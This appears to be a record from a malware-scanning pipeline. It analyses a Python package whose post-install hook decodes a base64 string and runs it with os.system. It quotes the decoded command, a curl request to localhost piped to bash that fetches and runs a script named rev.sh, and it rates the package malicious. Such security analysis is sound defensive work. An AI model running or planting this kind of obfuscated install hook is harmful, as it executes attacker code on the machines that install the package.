{
  "purpose": "Decodes a base64-encoded string and executes it via os.system during package installation, which runs a curl command fetching a script from localhost and piping it to bash.",
  "sources": "The base64-encoded string in notmalfunc(), which when decoded provides the command 'curl -s http://localhost:8000/rev.sh | bash'. This is invoked during the run() method of the AfterInstall class.",
  "sinks": "os.system() executing the decoded command, which involves fetching and executing remote code from localhost.",
  "flows": "The code decodes the base64 string in notmalfunc(), then passes it directly to os.system(), executing the curl command that fetches and runs a script from localhost.",
  "anomalies": "Use of base64 encoding to obfuscate a command that fetches and executes remote code during package installation; the URL points to localhost, which is unusual for remote malicious payloads but still suspicious in this context.",
  "analysis": "The script defines a function to decode base64 strings, then executes a command that fetches a script from localhost and pipes it to bash during the install process. The use of base64 obfuscation and remote code execution during setup are classic indicators of malicious intent. The URL pointing to localhost may suggest a controlled environment or a backdoor. All reports correctly identify this behavior, with scores reflecting high suspicion. The malware score is justified at 0.9 due to remote code execution, obfuscation score around 0.8-0.9 because of base64 encoding, and security risk at 0.9-1.0 for the potential to compromise the host system.",
  "conclusion": "The code is malicious, executing a remote script during package installation with obfuscation via base64. The behavior is consistent with supply chain attacks or backdoors. The high scores assigned in the reports are justified. The package should be flagged as malicious and avoided.",
